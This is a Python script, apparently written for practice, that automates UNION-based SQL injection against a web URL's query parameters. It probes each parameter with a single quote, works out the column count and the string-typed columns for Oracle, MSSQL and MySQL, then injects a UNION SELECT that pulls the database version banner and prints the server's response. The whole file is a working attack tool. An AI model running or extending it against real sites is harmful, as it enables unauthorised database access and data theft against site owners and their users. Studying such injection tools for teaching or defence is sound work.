
import requests
from urllib.parse import urlparse, parse_qs
import argparse



def is_server_error(code):
    return str(code)[0] == '5'

UNION_BASE= "' UNION SELECT NULL"
def identify_table_size(url_endpoint, target_parameter, db_type):
    counter=0
    while True:
        if db_type == "Oracle":
            params={ target_parameter : UNION_BASE + counter * ",NULL" + " FROM DUAL --"}
        elif db_type == "MSSQL":
            params={ target_parameter : UNION_BASE + counter * ",NULL" + "--"}
        elif db_type == "MySql":
            params={ target_parameter : UNION_BASE + counter * ",NULL" + "#"}
        resp = requests.get(url_endpoint, params=params)
        if not is_server_error(resp.status_code):
            break
        if counter > 50:
            print("Limit reached")
            return -1
        counter = counter + 1
    return counter + 1

def identify_string_column(url_endpoint, target_parameter, table_size, db_type):
    null_template=["NULL"] * table_size
    result=[]
    for i in range(table_size):
        query_string=",".join(null_template[0:i] + ["'a'"] + null_template[i+1:])
        if db_type == "Oracle":
            params={ target_parameter : "' UNION SELECT " + query_string + " FROM DUAL--"}
        elif db_type == "MSSQL":
            params={ target_parameter : "' UNION SELECT " + query_string + "--"}
        elif db_type =="MySql":
            params={ target_parameter : "' UNION SELECT " + query_string + "#"}
        resp = requests.get(url_endpoint, params=params)
        if not is_server_error(resp.status_code):
            result+=[True]
        else:
            result+=[False] 
    return result

def test_vuln_parameter(url_endpoint, target_paremeter):
    return is_server_error(requests.get(url_endpoint, params={target_paremeter : "'"}).status_code)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", dest="url")
    args = parser.parse_args()
    o = urlparse(args.url)
    query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    vulnerable_query_parameter=[]

    for p in query.keys():
        if test_vuln_parameter(url,p):
            tmp={"query_name":p}
            print("Parameter %s seems to be vulnerable, starting test" % p)
            db_type = "Oracle"
            table_size = identify_table_size(url,p,db_type)
            if table_size == -1:
                db_type = "MSSQL"
                table_size = identify_table_size(url,p,db_type)
            if table_size == -1:
                db_type = "MySql"
                table_size = identify_table_size(url,p,db_type)
            if table_size == -1:
                print("Unknown db type")
                return
            tmp["table_size"] = table_size
            print("Backing table size seems to be %s" % str(table_size))
            tmp["positions"]=[]
            for idx, r in enumerate(identify_string_column(url, p, table_size, db_type)):
                if r:
                    print("position %s is a string" % str(idx))
                    tmp["positions"]+=[idx]
                else:
                    print("position %s is not a string" % str(idx))
            vulnerable_query_parameter+=[tmp]


    v = vulnerable_query_parameter[0]

    if db_type == "Oracle":
        print("Oracle Attempt")
        select_columns=['NULL'] * v["table_size"]
        select_columns[v["positions"][0]]="BANNER"
        injection=" ' UNION SELECT {} FROM v$version--".format(",".join(select_columns))
        params={ v['query_name'] : injection}
        print(params)
        resp = requests.get(url, params=params)
        if not is_server_error(resp.status_code):
                print(resp.text)
        else:
            print('Server error, no response')

    elif db_type == "MSSQL":
        print("MSSQL/MySql attempt")
        select_columns=['NULL'] * v["table_size"]
        select_columns[v["positions"][0]]="@@version"
        injection=" ' UNION SELECT {}--".format(",".join(select_columns))
        params={ v['query_name'] : injection}
        print(params)
        resp = requests.get(url, params=params)
        if not is_server_error(resp.status_code):
                print(resp.text)
        else:
            print('Server error, no response')

    elif db_type == "MySql":
        print("MSSQL/MySql attempt")
        select_columns=['NULL'] * v["table_size"]
        select_columns[v["positions"][0]]="@@version"
        injection=" ' UNION SELECT {}#".format(",".join(select_columns))
        params={ v['query_name'] : injection}
        print(params)
        resp = requests.get(url, params=params)
        if not is_server_error(resp.status_code):
                print(resp.text)
        else:
            print('Server error, no response')


    



if __name__ == "__main__":
    main()